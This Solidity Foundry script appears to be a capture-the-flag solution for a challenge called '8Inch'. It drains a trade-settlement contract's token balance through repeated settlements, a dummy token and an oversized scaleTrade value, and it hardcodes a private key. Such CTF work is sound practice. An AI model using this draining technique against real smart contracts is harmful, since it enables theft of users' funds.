// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "src/8Inch.sol";

contract Solution is Script {
    function run() external {

        Challenge challenge = Challenge(0x368F8017A2b3Af3416977ba4EB8DD21d60A2538E);

        uint256 deployerKey = 0x4180e619866d4f4af137d2821d63ce9ac28df097045e0c05ee3e404edee154cc;

        vm.startBroadcast(deployerKey);

        TradeSettlement tradeSettlement = challenge.tradeSettlement();

        uint256 tradeId = 0;
        address maker;
        (maker,,,,,,,,) = tradeSettlement.getTrade(tradeId);

        tradeSettlement.settleTrade(tradeId, 8);
        tradeSettlement.settleTrade(tradeId, 8);
        tradeSettlement.settleTrade(tradeId, 8);
        tradeSettlement.settleTrade(tradeId, 8);


        SimpleERC20 dummy = new SimpleERC20("Novak", "NOVAK", 18, 1<<112);

        challenge.wojak().approve(address(tradeSettlement), 10000);
        dummy.approve(address(tradeSettlement), 1 << 112);

        tradeSettlement.createTrade(address(challenge.wojak()), address(dummy), 32, 1);

        tradeSettlement.scaleTrade(1, 2596148429267413814265248164610033);

        tradeSettlement.settleTrade(1, challenge.wojak().balanceOf(address(tradeSettlement)));

        challenge.wojak().transfer(address(0xc0ffee), 10 ether);

        vm.stopBroadcast();
    }
}
